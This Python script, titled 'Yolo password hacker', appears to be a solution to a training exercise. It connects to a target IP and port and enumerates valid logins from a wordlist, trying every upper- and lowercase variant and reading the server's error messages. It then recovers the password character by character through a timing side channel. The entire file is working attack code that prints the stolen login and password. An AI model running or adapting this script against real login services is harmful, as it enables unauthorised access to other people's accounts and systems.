import argparse
import itertools
import json
import socket
from string import ascii_letters, digits
from datetime import datetime, timedelta


def pick_login(list_of_logins):
    login_password = {"login": None, "password": " "}
    while True:
        suggested_login = list_of_logins.readline().strip()
        #  login_generator generates all possible combinations of uppercase and lowercase letters
        #  of the suggested login, e.g. "vs" results in "vs", "Vs", "vS", "VS"
        login_generator = map(lambda x: ''.join(x),
                              itertools.product(*([letter.upper(), letter.lower()] for letter in suggested_login)))
        for current_login in login_generator:
            #  create JSON login-pass pair and send it to the server
            login_password["login"] = current_login
            hacker.send(json.dumps(login_password).encode())

            server_answer = json.loads(hacker.recv(1024).decode())

            if server_answer["result"] == "Wrong password!":
                return current_login


def pick_password(charset, login):
    login_password = {"login": login, "password": None}
    current_state = ""
    while True:
        for char in charset:
            login_password["password"] = current_state + char
            send_time = datetime.now()
            hacker.send(json.dumps(login_password).encode())
            server_answer = json.loads(hacker.recv(1024).decode())
            response_time = datetime.now() - send_time

            if response_time.microseconds >= 90000:
                current_state += char
            if server_answer["result"] == "Connection success!":
                return current_state + char


parser = argparse.ArgumentParser(description='Yolo password hacker')

parser.add_argument('ip')
parser.add_argument('port')

args = parser.parse_args()

with socket.socket() as hacker:
    host = args.ip
    port = int(args.port)
    hacker.connect((host, port))

    with open('logins.txt') as common_logins:
        admin_login = pick_login(common_logins)

    admin_password = pick_password(ascii_letters + digits, admin_login)

dictionary_output = {"login": admin_login, "password": admin_password}

print(json.dumps(dictionary_output))
